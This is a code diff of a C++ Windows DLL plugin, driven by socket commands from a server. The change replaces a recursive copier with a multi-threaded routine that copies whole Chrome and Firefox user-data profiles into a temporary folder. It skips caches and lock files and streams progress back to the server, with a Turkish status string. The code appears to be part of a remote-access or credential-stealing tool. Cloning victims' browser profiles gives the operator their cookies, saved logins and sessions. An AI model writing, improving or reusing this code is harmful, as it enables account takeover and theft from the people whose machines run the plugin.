-static bool copy_recursive(const fs::path& src, const fs::path& dst) {
-    try {
-        if (!fs::exists(src)) return false;
-        if (!fs::exists(dst)) fs::create_directories(dst);
+static const vector<wstring> SKIPPED_PROFILE_DIRS = {
+    L"Cache", L"Code Cache", L"GPUCache", L"ShaderCache", L"DawnCache",
+    L"GrShaderCache", L"Snapshots", L"CrashReports", L"Crash Reports", L"Crashpad",
+    L"BrowserMetrics", L"BrowserMetrics-spare", L"component_crx_cache",
+    L"optimization_guide_model_downloads", L"Safe Browsing", L"FileTypePolicies",
+    L"PepperFlash", L"WidevineCdm", L"MEIPreload", L"OriginTrials",
+    L"cache2", L"startupCache", L"shader-cache", L"thumbnails", L"storage",
+    L"Service Worker", L"Media Cache", L"WebStorage", L"crash_reporter"
+};
 
+static bool should_skip_dir(const wstring& name) {
+    for (const auto& skip : SKIPPED_PROFILE_DIRS) {
+        if (_wcsicmp(name.c_str(), skip.c_str()) == 0) return true;
+    }
+    return false;
+}
+
+static void collect_file_pairs(const fs::path& src, const fs::path& dst, vector<pair<wstring, wstring>>& tasks) {
+    if (!fs::exists(src)) return;
+    try { fs::create_directories(dst); } catch (...) {}
+    try {
         for (const auto& entry : fs::directory_iterator(src)) {
             const auto& path = entry.path();
             wstring name = path.filename().wstring();
 
-            // Skip lock files
-            if (name == L"SingletonLock" || name == L"Parent.lock") continue;
+            if (name == L"SingletonLock" || name == L"Parent.lock" || name == L"parent.lock" || name == L"lock") continue;
 
-            // Skip bulky directories
             if (entry.is_directory()) {
-                if (name == L"Cache" || name == L"Code Cache" || name == L"GPUCache" ||
-                    name == L"Service Worker" || name == L"Media Cache" ||
-                    name == L"WebStorage" || name == L"crash_reporter" ||
-                    name == L"GrShaderCache") continue;
-
-                if (!copy_recursive(path, dst / name)) return false;
+                if (should_skip_dir(name)) continue;
+                collect_file_pairs(path, dst / name, tasks);
             } else {
-                if (!CopyFileW(path.wstring().c_str(), (dst / name).wstring().c_str(), FALSE)) {
-                    // Ignore errors for individual files to be robust
-                }
+                tasks.push_back({path.wstring(), (dst / name).wstring()});
             }
         }
-        return true;
-    } catch (...) {
-        return false;
+    } catch (...) {}
+}
+
+static bool copy_profile_parallel(const wstring& src_dir, const wstring& dst_dir, const string& label) {
+    vector<pair<wstring, wstring>> tasks;
+    collect_file_pairs(fs::path(src_dir), fs::path(dst_dir), tasks);
+
+    int total_files = (int)tasks.size();
+    if (total_files == 0) return true;
+
+    atomic<int> progress_count(0);
+    atomic<int> task_index(0);
+
+    // Reporter thread: periodically sends progress back to server
+    atomic<bool> reporter_running(true);
+    thread reporter([&]() {
+        while (reporter_running) {
+            int current_copied = progress_count.load();
+            int pct = (current_copied * 100) / total_files;
+            if (pct > 99) pct = 99;
+            send_status(label + " (" + to_string(pct) + "%)");
+            this_thread::sleep_for(chrono::milliseconds(150));
+        }
+    });
+
+    const int NUM_THREADS = 4;
+    vector<thread> workers;
+    for (int i = 0; i < NUM_THREADS; ++i) {
+        workers.push_back(thread([&]() {
+            while (true) {
+                int idx = task_index.fetch_add(1);
+                if (idx >= total_files) break;
+
+                const auto& task = tasks[idx];
+                fs::path dst_path(task.second);
+                try {
+                    fs::create_directories(dst_path.parent_path());
+                } catch (...) {}
+
+                if (!CopyFileW(task.first.c_str(), task.second.c_str(), FALSE)) {
+                    // Ignore errors for robustness
+                }
+                progress_count.fetch_add(1);
+            }
+        }));
     }
+
+    for (auto& t : workers) {
+        if (t.joinable()) t.join();
+    }
+
+    reporter_running = false;
+    if (reporter.joinable()) reporter.join();
+
+    send_status(label + " (100%)");
+    return true;
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -1649,8 +1841,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             if (fs::exists(tempProfileRoot)) fs::remove_all(tempProfileRoot);
                         } catch (...) {}
 
-                        send_status("Profiller kopyalanıyor...");
-                        if (!copy_recursive(fs::path(sourceUserData), fs::path(tempProfileRoot))) {
+                        if (!copy_profile_parallel(sourceUserData, tempProfileRoot, "Profiller kopyalanıyor")) {
                             send_error("Failed to copy browser profile.");
                             return;
                         }
